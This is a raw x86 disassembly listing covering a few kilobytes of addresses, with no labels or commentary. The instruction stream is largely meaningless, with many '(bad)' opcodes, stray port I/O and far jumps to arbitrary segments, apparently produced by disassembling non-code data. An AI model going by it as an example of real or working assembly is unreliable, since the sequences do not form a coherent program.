  4298d3:	scas   eax,DWORD PTR es:[edi]
  4298d4:	and    al,0x22
  4298d6:	in     al,dx
  4298d7:	cld    
  4298d8:	mov    BYTE PTR [edx],ch
  4298da:	leave  
  4298db:	in     al,0xa4
  4298dd:	jl     0x42990d
  4298df:	test   eax,0xe23130e7
  4298e4:	call   0x57e3:0x9250c6aa
  4298eb:	xor    esi,DWORD PTR [ebx]
  4298ed:	sbb    BYTE PTR [ecx-0x4d],dl
  4298f0:	mov    dl,BYTE PTR [ebx+0x4ddbcb01]
  4298f6:	sub    ch,BYTE PTR [edi-0x19]
  4298f9:	rcr    BYTE PTR [esi+0x6d792e7e],1
  4298ff:	popf   
  429900:	add    eax,0xee603e9d
  429905:	lods   eax,DWORD PTR ds:[esi]
  429906:	(bad)  
  429907:	call   0x43ad1df2
  42990c:	cmp    DWORD PTR [esp+ebx*2+0xa],ebx
	...
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	push   ecx
  429981:	test   eax,0xbc783b1a
  429986:	add    DWORD PTR [eax],eax
  429988:	add    al,0x1
  42998a:	add    BYTE PTR [eax],al
  42998c:	xlat   BYTE PTR ds:[ebx]
  42998d:	mov    bl,0x90
  42998f:	xchg   ecx,eax
  429990:	add    edx,DWORD PTR [edi+0x73967c76]
  429996:	bound  esp,QWORD PTR ss:[esi+0x78a59321]
  42999d:	pushf  
  42999e:	xor    eax,0x356693f
  4299a3:	pop    ecx
  4299a4:	ins    DWORD PTR es:[edi],dx
  4299a5:	mov    ch,0xb4
  4299a7:	or     ebx,DWORD PTR [ebp+0x25]
  4299aa:	popa   
  4299ab:	jp     0x429a0a
  4299ad:	lds    ebx,FWORD PTR [edi]
  4299af:	and    al,0xde
  4299b1:	test   BYTE PTR [ecx+0x69],al
  4299b4:	mov    eax,0xff7c3956
  4299b9:	pop    eax
  4299ba:	pop    ebx
  4299bb:	sar    DWORD PTR [edi+0x2501583e],0x11
  4299c2:	add    BYTE PTR [ebx],bh
  4299c4:	xchg   esp,eax
  4299c5:	pop    edx
  4299c6:	pop    esp
  4299c7:	sub    al,0xc6
  4299c9:	jne    0x429a15
  4299cb:	sar    BYTE PTR [edx-0x79],cl
  4299ce:	and    DWORD PTR [edi+0x35],0xe3efc6ff
  4299d5:	pop    esi
  4299d6:	std    
  4299d7:	or     al,0x69
  4299d9:	adc    DWORD PTR [ebp-0x1a63fe3d],eax
  4299df:	ror    dl,0xac
  4299e2:	aas    
  4299e3:	retf   0xccf7
  4299e6:	out    0xab,eax
  4299e8:	push   ecx
  4299e9:	test   BYTE PTR [eax+0x65577516],ch
  4299ef:	inc    esp
  4299f0:	jb     0x429a4c
  4299f2:	xor    eax,0x4686e486
  4299f7:	gs scas al,BYTE PTR es:[edi]
  4299f9:	mov    cl,0xed
  4299fb:	ins    DWORD PTR es:[edi],dx
  4299fc:	jnp    0x429a23
  4299fe:	sub    BYTE PTR [eax-0x405e6ae0],0x3d
  429a05:	dec    esi
  429a06:	add    ebp,DWORD PTR [eax]
  429a08:	mov    dh,0x74
  429a0a:	loope  0x429a22
  429a0c:	aaa    
  429a0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a0e:	std    
  429a0f:	cmp    dh,BYTE PTR [ecx+edx*4+0x3d]
  429a13:	xor    eax,0xeefc6cee
  429a18:	mov    edi,0xe006e316
  429a1d:	loopne 0x429a20
  429a1f:	loop   0x4299c0
  429a21:	push   0xb3f7b38c
  429a26:	add    edi,DWORD PTR [eax+ebx*1-0x360431d7]
  429a2d:	and    eax,0x5ff5a924
  429a32:	mov    WORD PTR [eax-0x1f],ds
  429a35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429a36:	jle    0x429aa6
  429a38:	retf   0xb14d
  429a3b:	pop    esi
  429a3c:	jg     0x429a4c
  429a3e:	test   eax,0x349e02c1
  429a43:	ret    0x1c90
  429a46:	std    
  429a47:	rcl    bh,0x6
  429a4a:	cmp    eax,0x14189bb3
  429a4f:	arpl   WORD PTR [edx-0x7405c25b],ax
  429a55:	jmp    0xff94:0x8f47fe53
  429a5c:	sub    ebx,eax
  429a5e:	cmp    bh,bl
  429a60:	inc    ebx
  429a61:	sbb    esi,DWORD PTR [esi]
  429a63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429a64:	aam    0xc
  429a66:	and    ebx,ecx
  429a68:	das    
  429a69:	test   BYTE PTR [ebx+0x35],0xf3
  429a6d:	fmul   QWORD PTR [ebp-0x76]
  429a70:	lea    ecx,[ecx-0x36]
  429a73:	inc    ebx
  429a74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429a75:	mov    dh,0xf6
  429a77:	fcmovne st,st(7)
  429a79:	inc    eax
  429a7a:	fdiv   QWORD PTR [eax]
  429a7c:	mov    DWORD PTR [eax-0x5323950f],esp
  429a82:	push   esi
  429a83:	(bad)  
  429a85:	jno    0x429a9b
  429a87:	mov    DWORD PTR [ebp-0xff6f16a],esi
  429a8d:	shl    BYTE PTR [ebp+edx*8+0x0],1
	...
  429af1:	add    BYTE PTR [eax],al
  429af3:	add    dh,cl
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x21a95667
  429b01:	ret    0x4625
  429b04:	jl     0x429ac3
  429b06:	add    DWORD PTR [eax],eax
  429b08:	add    al,0x1
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	pminub mm7,QWORD PTR [edi+eiz*2]
  429b10:	ins    DWORD PTR es:[edi],dx
  429b11:	sbb    ch,BYTE PTR [ebx]
  429b13:	test   DWORD PTR [edi],esi
  429b15:	jno    0x429b22
  429b17:	push   eax
  429b18:	cmp    esp,DWORD PTR [edx]
  429b1a:	cmp    eax,0x2aa5bf3
  429b1f:	add    DWORD PTR [eax-0x32],0xffffffb6
  429b23:	clc    
  429b24:	arpl   di,bx
  429b26:	sub    al,0xc8
  429b28:	xor    ah,al
  429b2a:	jae    0x429b57
  429b2c:	test   al,0x78
  429b2e:	pop    es
  429b2f:	push   cs
  429b30:	mov    dl,0xf8
  429b32:	pop    ebp
  429b33:	mov    al,ds:0xf9fe92eb
  429b38:	and    al,0x8f
  429b3a:	dec    DWORD PTR [esi]
  429b3c:	cmp    BYTE PTR [esi],dh
  429b3e:	pushf  
  429b3f:	or     al,0x32
  429b41:	xor    BYTE PTR [esi],ah
  429b43:	enter  0xab19,0xde
  429b47:	les    esp,FWORD PTR ds:[edi-0x5c]
  429b4b:	popf   
  429b4c:	mov    BYTE PTR [ebx-0x7c],ch
  429b4f:	pusha  
  429b50:	mov    ds,WORD PTR [ecx-0x446dff3a]
  429b56:	outs   dx,DWORD PTR ds:[esi]
  429b57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b58:	lock push eax
  429b5a:	fbstp  TBYTE PTR [eax+0xf]
  429b5d:	dec    eax
  429b5e:	mov    ebx,0x4b8ae6ba
  429b63:	in     eax,0x59
  429b65:	sbb    dh,BYTE PTR [ebp+0x71698e6d]
  429b6b:	add    al,0xb4
  429b6d:	and    eax,0x33980d4f
  429b72:	ins    BYTE PTR es:[edi],dx
  429b73:	push   0x2e
  429b75:	sbb    BYTE PTR [ebx-0x3a],0x9b
  429b79:	sbb    DWORD PTR [edx+0x47556fee],edx
  429b7f:	(bad)
  429b82:	adc    al,0x45
  429b84:	dec    esi
  429b85:	leave  
  429b86:	pop    es
  429b87:	pop    es
  429b88:	leave  
  429b89:	out    0xbf,al
  429b8b:	adc    BYTE PTR [edi+0x3d],al
  429b8e:	mov    ds:0x2d72b660,eax
  429b93:	mov    edi,edx
  429b95:	fiadd  DWORD PTR gs:[ebx+0x5874d89f]
  429b9c:	sub    DWORD PTR [ebx],esi
  429b9e:	mov    ?,WORD PTR [edx-0x6]
  429ba1:	adc    DWORD PTR [ecx+0x649d595b],esi
  429ba7:	in     al,0x47
  429ba9:	scas   eax,DWORD PTR es:[edi]
  429baa:	pop    ecx
  429bab:	cli    
  429bac:	sbb    eax,0x23dabb1d
  429bb1:	(bad)  
  429bb2:	sahf   
  429bb3:	mov    ds:0xf25c7f17,al
  429bb8:	int    0xae
  429bba:	je     0x429c01
  429bbc:	imul   ebp,DWORD PTR [esi-0x42],0x883d20b1
  429bc3:	fwait
  429bc4:	xor    BYTE PTR [ebp+ecx*4+0x306a056c],bh
  429bcb:	loope  0x429c05
  429bcd:	inc    esp
  429bce:	sbb    ecx,DWORD PTR [edi+0x67]
  429bd1:	jno    0x429c0e
  429bd3:	ja     0x429c30
  429bd5:	outs   dx,DWORD PTR ds:[esi]
  429bd6:	shr    BYTE PTR [eax-0x4d9f2f7b],0x82
  429bdd:	push   ds
  429bde:	jmp    0x429bd9
  429be0:	addr16 push ds
  429be2:	jbe    0x429c08
  429be4:	mov    al,ds:0xb52308f0
  429be9:	outs   dx,BYTE PTR ds:[esi]
  429bea:	and    al,0x46
  429bec:	or     eax,0xa5bc5496
  429bf1:	push   esp
  429bf2:	mov    ch,0x2
  429bf4:	mov    dl,0xc4
  429bf6:	add    DWORD PTR [edi],esp
  429bf8:	or     BYTE PTR ds:0x3ef4a356,ah
  429bfe:	jp     0x429c01
  429c00:	in     eax,dx
  429c01:	int3   
  429c02:	adc    eax,0xb4895c96
  429c07:	xor    eax,DWORD PTR [edi]
  429c09:	nop
  429c0a:	repz scas al,BYTE PTR es:[edi]
  429c0c:	xchg   ecx,esp
  429c0e:	sbb    BYTE PTR [esi],ch
	...
  429c74:	mov    ds:0xb788a616,eax
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [eax+0x17],bl
  429c82:	in     al,dx
  429c83:	and    eax,DWORD PTR [eax+0x40001be]
  429c89:	add    DWORD PTR [eax],eax
  429c8b:	add    BYTE PTR [ebx],bl
  429c8d:	fild   WORD PTR [eax]
  429c8f:	pop    es
  429c90:	hlt    
  429c91:	or     al,0x41
  429c93:	int    0x2e
  429c95:	es xchg esi,eax
  429c97:	add    al,0x86
  429c99:	mov    cl,0xfa
  429c9b:	pusha  
  429c9c:	popf   
  429c9d:	aas    
  429c9e:	cmp    DWORD PTR [edi],0x4747c4d0
  429ca4:	arpl   sp,di
  429ca6:	stos   DWORD PTR es:[edi],eax
  429ca7:	push   eax
  429ca8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ca9:	jg     0x429d22
  429cab:	icebp  
  429cac:	aas    
  429cad:	in     eax,dx
  429cae:	sub    BYTE PTR [ecx-0x34824040],dh
  429cb4:	pushf  
  429cb5:	outs   dx,DWORD PTR ds:[esi]
  429cb6:	sbb    bh,BYTE PTR ds:0xb14d366b
  429cbc:	ret    
  429cbd:	adc    BYTE PTR [ecx],0x49
  429cc0:	imul   esi,DWORD PTR [ebp-0x747653fd],0x12
  429cc7:	pop    eax
  429cc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429cc9:	push   0xaca35fad
  429cce:	adc    DWORD PTR [edi-0x2089820d],edi
  429cd4:	and    esp,esp
  429cd6:	in     al,0x30
  429cd8:	out    0xc5,al
  429cda:	aam    0x19
  429cdc:	mov    DWORD PTR [esi+0xcded1ba],esi
  429ce2:	into   
  429ce3:	push   ebx
  429ce4:	and    al,0x48
  429ce6:	test   al,0xb2
  429ce8:	mov    ds:0x1716b257,eax
  429ced:	or     al,0x86
  429cef:	in     al,dx
  429cf0:	ror    BYTE PTR [eax],cl
  429cf2:	pop    esp
  429cf3:	in     eax,0x75
  429cf5:	test   edi,edx
  429cf7:	xor    BYTE PTR [esi+0x31],0x1a
  429cfb:	sbb    dl,al
  429cfd:	ret    
  429cfe:	loope  0x429c9d
  429d00:	mov    ecx,0xde9c0469
  429d05:	retf   
  429d06:	retf   0xe6d6
  429d09:	mov    ecx,0x4a75450f
  429d0e:	iret   
  429d0f:	stos   BYTE PTR es:[edi],al
  429d10:	lods   al,BYTE PTR ds:[esi]
  429d11:	imul   ecx,esi,0xffffffc0
  429d14:	or     bl,al
  429d16:	or     dl,dl
  429d18:	xor    BYTE PTR [esi],ch
  429d1a:	js     0x429d94
  429d1c:	pop    ebp
  429d1d:	outs   dx,BYTE PTR ds:[esi]
  429d1e:	or     DWORD PTR [edi+eax*1],0xffffff99
  429d22:	ret    
  429d23:	(bad)  
  429d24:	mov    ebx,0x32641a7f
  429d29:	sub    eax,0x76d1668d
  429d2e:	xchg   edx,eax
  429d2f:	mov    dh,0xfb
  429d31:	and    DWORD PTR [edx+0x33],edi
  429d34:	jl     0x429d04
  429d36:	enter  0x37dc,0x26
  429d3a:	stos   DWORD PTR es:[edi],eax
  429d3b:	adc    al,0x88
  429d3d:	dec    ecx
  429d3e:	push   esi
  429d3f:	lods   al,BYTE PTR ds:[esi]
  429d40:	repz aaa 
  429d42:	cmp    eax,0x6e7dda78
  429d47:	and    bh,BYTE PTR [ebx-0x3c7b6660]
  429d4d:	jmp    0x1bf:0xd65653f4
  429d54:	cli    
  429d55:	or     bh,BYTE PTR ds:0xc11615dd
  429d5b:	mov    edi,0x831c832b
  429d60:	push   ecx
  429d61:	cs ins DWORD PTR es:[edi],dx
  429d63:	pop    esi
  429d64:	retf   0x6d41
  429d67:	jg     0x429cef
  429d69:	pop    edi
  429d6a:	stc    
  429d6b:	inc    eax
  429d6c:	imul   esi,eax,0xffffffbb
  429d6f:	push   es
  429d70:	popa   
  429d71:	and    DWORD PTR [eax],esp
  429d73:	mov    eax,edx
  429d75:	push   es
  429d76:	imul   edx,DWORD PTR [edi+0x3d],0x39a36ec7
  429d7d:	mov    BYTE PTR [ebx-0x57],cl
  429d80:	dec    ebx
  429d81:	xor    edx,DWORD PTR [ecx]
  429d83:	popa   
  429d84:	xor    al,0x4b
  429d86:	cmp    esp,DWORD PTR [esi-0x2f]
  429d89:	das    
  429d8a:	sub    eax,0x4f847cd8
  429d8f:	jne    0x429d91
	...
  429df1:	add    BYTE PTR [eax],al
  429df3:	add    BYTE PTR [ebx-0x13f33b49],bl
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	jno    0x429d9a
  429e02:	repz scas eax,DWORD PTR es:[edi]
  429e04:	test   BYTE PTR [edi+0x1040001],bh
  429e0a:	add    BYTE PTR [eax],al
  429e0c:	lods   eax,DWORD PTR ds:[esi]
  429e0d:	fadd   DWORD PTR [ebp+edx*8-0xd]
  429e11:	xor    BYTE PTR [ecx-0x6b],al
  429e14:	xor    cl,BYTE PTR [ebx]
  429e16:	cmp    BYTE PTR [ebx+0x56],0xaf
  429e1a:	les    eax,FWORD PTR [edx]
  429e1c:	adc    edi,DWORD PTR [edi-0x30]
  429e1f:	push   eax
  429e20:	inc    ecx
  429e21:	and    al,0xe7
  429e23:	sub    DWORD PTR [eax-0x7f],esi
  429e26:	cwde   
  429e27:	mov    edx,0xe2a69cda
  429e2c:	sub    eax,0xf5286223
  429e31:	lahf   
  429e32:	call   0x3053:0xb58b3f08
  429e39:	aas    
  429e3a:	xchg   edx,eax
  429e3b:	add    ch,BYTE PTR [esi-0x26039eab]
  429e41:	rcl    BYTE PTR [ebx-0x1f],0x84
  429e45:	sbb    al,0x44
  429e47:	cmp    al,0xde
  429e49:	in     al,dx
  429e4a:	jno    0x429e7f
  429e4c:	adc    edx,DWORD PTR [edx-0x4a374889]
  429e52:	xor    eax,0xd5510671
  429e57:	leave  
  429e58:	lea    eax,[esi+0x4255f109]
  429e5e:	jmp    0x429de4
  429e60:	aam    0x9f
  429e62:	mov    BYTE PTR [esi],ah
  429e64:	sbb    dh,BYTE PTR [eax-0x28]
  429e67:	sub    BYTE PTR [ebx+0x56],ch
  429e6a:	(bad)  
  429e6b:	xchg   esp,eax
  429e6c:	xlat   BYTE PTR ds:[ebx]
  429e6d:	inc    edx
  429e6e:	or     BYTE PTR [eax],bl
  429e70:	xchg   ebx,eax
  429e71:	mov    esi,0xfbb796a0
  429e76:	dec    ebp
  429e77:	out    dx,eax
  429e78:	pop    ecx
  429e79:	(bad)  
  429e7a:	pop    esp
  429e7b:	cmp    eax,0xc1bf8898
  429e80:	jns    0x429ed6
  429e82:	and    DWORD PTR [edi],edi
  429e84:	mov    edx,0x37feda19
  429e89:	(bad)  
  429e8a:	jns    0x429eb2
  429e8c:	cwde   
  429e8d:	add    esp,DWORD PTR ds:0x9b469b33
  429e93:	and    al,0xcd
  429e95:	jl     0x429eec
  429e97:	ror    DWORD PTR [edx+0x27],0x8e
  429e9b:	cdq    
  429e9c:	icebp  
  429e9d:	iret   
  429e9e:	and    eax,0xa4e910e4
  429ea3:	cs push esp
  429ea5:	sub    BYTE PTR [eax+0x59],bh
  429ea8:	cmp    BYTE PTR ss:[ebp-0x4c],ch
  429eac:	mov    DWORD PTR [esi-0x1da7cd8],edx
  429eb2:	stos   DWORD PTR es:[edi],eax
  429eb3:	inc    esp
  429eb4:	pop    ebx
  429eb5:	sub    BYTE PTR ds:0x650d8f36,dh
  429ebb:	adc    al,0x26
  429ebd:	inc    ebp
  429ebe:	adc    dh,cl
  429ec0:	test   DWORD PTR [edi],0x62509d6c
  429ec6:	push   esi
  429ec7:	stc    
  429ec8:	add    ebx,DWORD PTR [eax]
  429eca:	xchg   esi,eax
  429ecb:	fs pop esp
  429ecd:	ja     0x429f42
  429ecf:	sub    esp,DWORD PTR [eax-0x49136a74]
  429ed5:	pop    es
  429ed6:	jp     0x429e75
  429ed8:	in     al,dx
  429ed9:	inc    DWORD PTR [esi+ebx*4+0x54f66d71]
  429ee0:	stos   BYTE PTR es:[edi],al
  429ee1:	jmp    0xa80e:0x3f2ec715
  429ee8:	call   0x4c5:0xa813b513
  429eef:	int    0x1
  429ef1:	add    ebp,DWORD PTR [edi]
  429ef3:	mov    esp,0xa6a7c43b
  429ef8:	mov    ebp,0x8500cc66
  429efd:	hlt    
  429efe:	out    dx,eax
  429eff:	mov    ebx,0x95c37f8d
  429f04:	add    eax,0xb76fc365
  429f09:	imul   edi,DWORD PTR [ecx],0xa852ce86
  429f0f:	call   0x429f14
	...
  429f74:	xor    DWORD PTR [ebp-0x38],eax
  429f77:	push   es
  429f78:	cld    
  429f79:	(bad)  
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx+0x7229f348]
  429f84:	mov    al,al
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    al,0x1
  429f8a:	add    BYTE PTR [eax],al
  429f8c:	rcr    DWORD PTR [edi+ebp*2-0x7f],1
  429f90:	and    eax,ebp
  429f92:	in     eax,dx
  429f93:	(bad)  
  429f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429f95:	inc    ecx
  429f96:	lea    edi,[esi]
  429f98:	mov    ebp,0x96919a8a
  429f9d:	jns    0x429f8e
  429f9f:	loopne 0x429f21
  429fa1:	emms   
  429fa3:	pop    edi
  429fa4:	les    esi,FWORD PTR [ecx-0x59]
  429fa7:	pop    ss
  429fa8:	int3   
  429fa9:	sbb    DWORD PTR [edx],edx
  429fab:	push   edi
  429fac:	dec    ebp
  429fad:	out    dx,eax
  429fae:	leave  
  429faf:	jmp    0xe07:0xb2e440b7
  429fb6:	push   edi
  429fb7:	xchg   ebp,eax
  429fb8:	mov    ebp,0x369652d5
  429fbd:	daa    
  429fbe:	icebp  
  429fbf:	or     eax,0x32a545bb
  429fc4:	rcr    DWORD PTR [edi],1
  429fc6:	mov    eax,0xd479f9c3
  429fcb:	(bad)  
  429fcc:	lahf   
  429fcd:	dec    eax
  429fce:	inc    edx
  429fcf:	jns    0x42a041
  429fd1:	adc    eax,0x42c24b99
  429fd6:	out    0xfe,eax
  429fd8:	pop    ds
  429fd9:	rcr    bl,0xab
  429fdc:	ss aaa 
  429fde:	in     eax,0x41
  429fe0:	(bad)  
  429fe1:	lock lods eax,DWORD PTR ds:[esi]
  429fe3:	jmp    0x7ad1d911
  429fe8:	inc    esi
  429fe9:	and    eax,edx
  429feb:	mov    gs,edi
  429fed:	stos   DWORD PTR es:[edi],eax
  429fee:	mov    edi,0x9ff58a91
  429ff3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ff4:	mov    al,ds:0x202490e4
  429ff9:	push   esp
  429ffa:	cmp    DWORD PTR [edi],0xffffffb0
  429ffd:	hlt    
  429ffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429fff:	rcl    BYTE PTR [ecx-0x7d958fa2],1
  42a005:	aaa    
  42a006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a007:	call   0x786fb4a2
  42a00c:	dec    edi
  42a00d:	outs   dx,DWORD PTR ds:[esi]
  42a00e:	sub    al,0xb3
  42a010:	sbb    al,0xbd
  42a012:	popf   
  42a013:	aam    0xc0
  42a015:	call   0xea995c3f
  42a01a:	fcmovnu st,st(3)
  42a01c:	and    dh,BYTE PTR [ebx+0x2a]
  42a01f:	inc    ecx
  42a020:	and    eax,0xc47998cd
  42a025:	inc    edx
  42a026:	mov    bl,0xdb
  42a028:	jns    0x429fea
  42a02a:	(bad)  
  42a02b:	addr16 or al,0xd5
  42a02e:	inc    ecx
  42a02f:	inc    esi
  42a030:	les    edi,FWORD PTR [edi+0x26]
  42a033:	dec    ebp
  42a034:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a035:	fstp   DWORD PTR [eax+0x73]
  42a038:	ret    
  42a039:	aaa    
  42a03a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a03b:	xor    DWORD PTR [ebx-0x3de5ea18],ebx
  42a041:	push   ecx
  42a042:	push   ebx
  42a043:	jmp    0x524c:0x9803f8a1
  42a04a:	jmp    0x430d69b0
  42a04f:	dec    eax
  42a050:	mov    edi,0x87a45146
  42a055:	push   esi
  42a056:	scas   al,BYTE PTR es:[edi]
  42a057:	ins    DWORD PTR es:[edi],dx
  42a058:	fild   QWORD PTR [esi+0x10]
  42a05b:	call   0xe656:0x1623fae
  42a062:	push   esi
  42a063:	pop    esi
  42a064:	into   
  42a065:	add    esi,ebx
  42a067:	loopne 0x42a04c
  42a069:	iret   
  42a06a:	and    BYTE PTR [ecx+0x42],bh
  42a06d:	mov    al,0x61
  42a06f:	int3   
  42a070:	ja     0x42a083
  42a072:	add    al,0x3d
  42a074:	xor    BYTE PTR [eax-0x72aaf6fc],bl
  42a07a:	or     eax,0x5dd8cb8c
  42a07f:	in     eax,0xb7
  42a081:	test   BYTE PTR ds:0x7edd8fc6,ah
  42a087:	or     ebx,DWORD PTR [ebx-0xc]
  42a08a:	retf   0x7699
  42a08d:	int3   
  42a08e:	ficom  DWORD PTR [edx]
	...
  42a0f4:	xlat   BYTE PTR ds:[ebx]
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	lahf   
  42a101:	outs   dx,DWORD PTR ds:[esi]
  42a102:	xchg   esi,eax
  42a103:	inc    esp
  42a104:	mov    ecx,es
  42a106:	add    DWORD PTR [eax],eax
  42a108:	add    al,0x1
  42a10a:	add    BYTE PTR [eax],al
  42a10c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a10d:	fld    DWORD PTR [eax-0x5daafbdc]
  42a113:	inc    ecx
  42a114:	cmp    eax,0x26fcc0c4
  42a119:	je     0x42a152
  42a11b:	cmp    esi,DWORD PTR [ebx-0x18]
  42a11e:	pop    edi
  42a11f:	sbb    DWORD PTR [ebp+0x75],eax
  42a122:	out    0x12,eax
  42a124:	xchg   edi,eax
  42a125:	test   al,0xef
  42a127:	dec    edi
  42a128:	push   eax
  42a129:	xor    DWORD PTR [edi+edi*1],esi
  42a12c:	mov    WORD PTR [eax],gs
  42a12e:	inc    ebx
  42a12f:	rcr    DWORD PTR [edi+ecx*4-0x53],1
  42a133:	rcl    ch,0xd4
  42a136:	xchg   ebp,eax
  42a137:	push   DWORD PTR [edi+0x7d]
  42a13a:	ret    0xe396
  42a13d:	xor    eax,0x6146f45b
  42a142:	inc    edi
  42a143:	push   es
  42a144:	xlat   BYTE PTR ds:[ebx]
  42a145:	inc    ebx
  42a146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a147:	cmp    ecx,0x36
  42a14a:	stc    
  42a14b:	lds    edx,FWORD PTR [ebp+0x5c755abc]
  42a151:	loope  0x42a118
  42a153:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a154:	test   cl,al
  42a156:	stc    
  42a157:	xchg   ebx,eax
  42a158:	in     al,0xe8
  42a15a:	sub    bl,bl
  42a15c:	call   0xe0a19f4b
  42a161:	xchg   ebx,eax
  42a162:	in     al,0xd4
  42a164:	aas    
  42a165:	les    ecx,FWORD PTR [eax+0x1f]
  42a168:	jp     0x42a145
  42a16a:	mov    eax,ds:0x3b9b5e84
  42a16f:	and    eax,0x25ab6e26
  42a174:	mov    ebx,0x5e09a7fe
  42a179:	fld    QWORD PTR [ebx-0x6d]
  42a17c:	dec    esp
  42a17d:	jne    0x42a19b
  42a17f:	pop    ecx
  42a180:	gs sub al,0x4
  42a183:	repnz (bad) 
  42a185:	out    dx,al
  42a186:	xchg   esp,eax
  42a187:	jmp    0x42a182
  42a189:	mov    ds:0x6be2646b,al
  42a18e:	scas   eax,DWORD PTR es:[edi]
  42a18f:	jno    0x42a179
  42a191:	mov    dl,0x47
  42a193:	mov    esi,0xc260d290
  42a198:	pop    ebx
  42a199:	sbb    edi,DWORD PTR [ebx-0x715df141]
  42a19f:	and    BYTE PTR [ebp-0x4b39a69a],ah
  42a1a5:	jecxz  0x42a170
  42a1a7:	call   0x954c7cc7
  42a1ac:	sub    eax,DWORD PTR [edx+ebp*4+0x536a72b5]
  42a1b3:	imul   ebx,DWORD PTR ds:0x7ad32896,0x66
  42a1ba:	mov    ch,BYTE PTR [eax]
  42a1bc:	pop    eax
  42a1bd:	addr16 test ebx,0xcc95d1a
  42a1c4:	ss stos BYTE PTR es:[edi],al
  42a1c6:	test   BYTE PTR [ecx+ebp*4-0x6dcd1cc1],bh
  42a1cd:	mov    edx,edi
  42a1cf:	mov    esi,DWORD PTR [bx+si+0x71]
  42a1d3:	cwde   
  42a1d4:	idiv   ah
  42a1d6:	xchg   DWORD PTR [ecx+0x60],edx
  42a1d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a1da:	lahf   
  42a1db:	adc    al,0xdb
  42a1dd:	sbb    ebx,DWORD PTR [ecx+0x56]
  42a1e0:	sbb    eax,edi
  42a1e2:	cwde   
  42a1e3:	(bad)  
  42a1e5:	mov    WORD PTR [ebp+0x15b82bc4],es
  42a1eb:	retf   0x873e
  42a1ee:	mov    edx,0x5a292601
  42a1f3:	sbb    eax,0xb848fcb3
  42a1f8:	div    DWORD PTR [esi-0x6f]
  42a1fb:	xchg   edi,eax
  42a1fc:	jns    0x42a1a6
  42a1fe:	or     dh,BYTE PTR [eax+eiz*8]
  42a201:	shr    BYTE PTR [edi],0x82
  42a204:	sbb    eax,0x91cde0b1
  42a209:	ret    0xeab
  42a20c:	xchg   edx,eax
  42a20d:	int3   
  42a20e:	mov    ds:0x7b,al
	...
  42a273:	add    BYTE PTR [ebx],ch
  42a275:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fldz   
  42a281:	and    edi,DWORD PTR [ecx]
  42a283:	scas   al,BYTE PTR es:[edi]
  42a284:	nop
  42a285:	ret    0x1
  42a288:	add    al,0x1
  42a28a:	add    BYTE PTR [eax],al
  42a28c:	sub    eax,0x727d096e
  42a291:	dec    esp
  42a292:	cs stos BYTE PTR es:[edi],al
  42a294:	jge    0x42a237
  42a296:	mov    ebx,ecx
  42a298:	cmp    eax,eax
  42a29a:	jmp    0xf896:0xd30f37cd
  42a2a1:	ss loope 0x42a2f2
  42a2a4:	cmp    eax,0x95e70201
  42a2a9:	xor    BYTE PTR [esi+0x42],0x6e
  42a2ad:	mov    gs,WORD PTR [esi]
  42a2af:	aaa    
  42a2b0:	sar    dl,cl
  42a2b2:	rcl    bh,1
  42a2b4:	sbb    esp,ebp
  42a2b6:	retf   0x8baa
  42a2b9:	push   ds
  42a2ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a2bb:	mov    ds:0xb0a16acf,eax
  42a2c0:	and    eax,0x25e5f7d3
  42a2c5:	mov    esp,DWORD PTR [edx]
  42a2c7:	jnp    0x42a27a
  42a2c9:	test   edi,esp
  42a2cb:	sti    
  42a2cc:	nop
  42a2cd:	pop    edi
  42a2ce:	inc    esp
  42a2cf:	inc    ebx
  42a2d0:	add    BYTE PTR [edi+0x13],ch
  42a2d3:	inc    eax
  42a2d4:	loopne 0x42a2c0
  42a2d6:	xchg   edx,eax
  42a2d7:	jb     0x42a296
  42a2d9:	rcl    DWORD PTR ss:[edx],cl
  42a2dc:	pop    esp
  42a2dd:	cmp    al,0xa6
  42a2df:	jb     0x42a2cb
  42a2e1:	mov    ebx,0x67b5e434
  42a2e6:	sti    
  42a2e7:	mov    ebp,0x3345823d
  42a2ec:	and    dl,ch
  42a2ee:	shr    BYTE PTR [edi+ecx*2],cl
  42a2f1:	ins    DWORD PTR es:[edi],dx
  42a2f2:	adc    al,0x1b
  42a2f4:	lods   al,BYTE PTR ds:[esi]
  42a2f5:	jnp    0x42a36f
  42a2f7:	sbb    ebp,ecx
